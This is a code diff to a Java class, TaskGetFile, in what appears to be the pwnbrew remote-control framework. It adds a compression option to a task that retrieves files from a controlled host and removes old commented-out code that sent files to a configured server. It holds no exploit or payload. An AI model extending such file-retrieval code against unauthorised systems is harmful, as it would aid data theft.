@@ -46,6 +46,7 @@ import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.PortManager;
 import pwnbrew.network.ControlOption;
 import pwnbrew.network.file.FileMessageManager;
+import pwnbrew.utilities.SocketUtilities;
 
 
 /**
@@ -54,7 +55,10 @@ import pwnbrew.network.file.FileMessageManager;
  */
 public final class TaskGetFile extends TaskStatus {
 
-    private String hashFilenameStr;
+    private String hashFilenameStr;    
+    private int compress_flag = 0;
+    public static final byte OPTION_COMPRESSED = (byte)181;
+    
     
     //Class name
     private static final String NAME_Class = TaskGetFile.class.getSimpleName();
@@ -87,7 +91,9 @@ public final class TaskGetFile extends TaskStatus {
                     case OPTION_HASH_FILENAME:
                         hashFilenameStr = new String( theValue, "US-ASCII");
                         break;
-
+                    case OPTION_COMPRESSED:
+                        compress_flag = SocketUtilities.byteArrayToInt( theValue );
+                        break;
                     case TASK_STATUS:
                         taskStatus = new String( theValue, "US-ASCII");
                         break;
@@ -112,6 +118,16 @@ public final class TaskGetFile extends TaskStatus {
        return hashFilenameStr;
     }
     
+     //===============================================================
+    /**
+     * Returns a file reference specifying the local file name.
+     *
+     * @return
+     */
+    public boolean useCompression() {
+       return (compress_flag == 1);
+    }
+    
     //===============================================================
     /**
     *   Performs the logic specific to the message.
@@ -120,46 +136,19 @@ public final class TaskGetFile extends TaskStatus {
     */
     @Override
     public void evaluate( PortManager passedManager ) {       
-            
-//        //Get the filename hash 
-//        String theHashFilenameStr = getHashFilenameString();
-//        String[] theFilePathArr = theHashFilenameStr.split(":", 2);
-//        if( theFilePathArr.length > 1 ){
-//
-//            String theFilePath = theFilePathArr[1];
-//            //Debug
-//            DebugPrinter.printMessage( this.getClass().getSimpleName(), "Received TaskGetFile for " + theFilePath);
-//
-//            File fileToSend = new File(theFilePath);
-//            if(fileToSend.exists()){
-//
-//                ClientConfig theConf = ClientConfig.getConfig();
-//                int socketPort = theConf.getSocketPort();
-//                String serverIp = theConf.getServerIp();
-            try {
-                //Get the port router
-                FileMessageManager aFMM = FileMessageManager.getFileMessageManager();
-                if( aFMM == null )
-                    aFMM = FileMessageManager.initialize( passedManager );
-                
-                aFMM.fileDownload( this );
-                
-            } catch ( LoggableException | IOException ex) {
-                RemoteLog.log(Level.INFO, NAME_Class, "evaluate()", ex.getMessage(), ex );
-            }    
 
-//                ClientPortRouter aPR = (ClientPortRouter) passedManager.getPortRouter( socketPort );
-//                int retChannelId = aPR.ensureConnectivity( serverIp, socketPort, this );   
-//                if(retChannelId != 0 ){
-//                    //Queue the file to be sent
-//                    String fileHashNameStr = new StringBuilder().append("0").append(":").append(theFilePath).toString();
-//
-//                    PushFile thePFM = new PushFile( getTaskId(), retChannelId, fileHashNameStr, fileToSend.length(), PushFile.FILE_DOWNLOAD );
-//                    thePFM.setDestHostId( getSrcHostId() );
-//                    DataManager.send(passedManager, thePFM);
-//                }
-//            }
-//        }
+        try {
+            //Get the port router
+            FileMessageManager aFMM = FileMessageManager.getFileMessageManager();
+            if( aFMM == null )
+                aFMM = FileMessageManager.initialize( passedManager );
+
+            aFMM.fileDownload( this );
+
+        } catch ( LoggableException | IOException ex) {
+            RemoteLog.log(Level.INFO, NAME_Class, "evaluate()", ex.getMessage(), ex );
+        }    
+
     }
     
 
